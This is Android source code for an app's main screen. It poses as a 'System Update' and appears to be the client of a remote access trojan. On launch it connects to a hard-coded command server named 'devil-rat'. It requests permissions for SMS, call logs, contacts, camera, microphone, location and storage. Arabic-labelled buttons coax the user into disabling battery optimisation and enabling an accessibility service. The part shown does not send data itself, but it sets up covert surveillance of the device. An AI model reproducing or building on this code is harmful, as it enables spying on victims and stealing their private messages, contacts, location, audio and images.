package com.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;
import io.socket.client.IO;
import io.socket.client.Socket;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;
    private LinearLayout layout;
    private Socket mSocket;

    private static final String SERVER_URL = "https://devil-rat-production.up.railway.app";

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        layout = findViewById(R.id.main_layout);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);
        activateBtn.setOnClickListener(v -> requestAllPermissions());
        addSettingsButtons();
        connectToServer();
    }

    private void connectToServer() {
        try {
            mSocket = IO.socket(SERVER_URL);
            mSocket.on(Socket.EVENT_CONNECT, args -> runOnUiThread(() -> statusText.setText("✅ متصل بالخادم")));
            mSocket.on(Socket.EVENT_DISCONNECT, args -> runOnUiThread(() -> statusText.setText("❌ انقطع الاتصال")));
            mSocket.connect();
        } catch (URISyntaxException e) {
            statusText.setText("❌ خطأ في عنوان الخادم");
        }
    }

    private void addSettingsButtons() {
        if (layout == null) return;
        Button btnBattery = new Button(this);
        btnBattery.setText("1. تعطيل تحسين البطارية");
        btnBattery.setOnClickListener(v -> { try { Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); } catch (Exception e) {} });
        layout.addView(btnBattery);

        Button btnBg = new Button(this);
        btnBg.setText("2. إذن العمل في الخلفية");
        btnBg.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS); i.setData(Uri.parse("package:" + getPackageName())); startActivity(i); });
        layout.addView(btnBg);

        Button btnAccess = new Button(this);
        btnAccess.setText("3. إعدادات إمكانية الوصول (مهم)");
        btnAccess.setOnClickListener(v -> { Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS); startActivity(i); Toast.makeText(this, "ابحث عن System Update وفعّلها", Toast.LENGTH_LONG).show(); });
        layout.addView(btnAccess);
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }
        done();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) done();
    }

    private void done() {
        Toast.makeText(this, "✅ التطبيق جاهز", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل");
        if (mSocket != null && !mSocket.connected()) mSocket.connect();
    }

    @Override
    protected void onDestroy() {
        if (mSocket != null) { mSocket.disconnect(); mSocket.off(); }
        super.onDestroy();
    }
    }
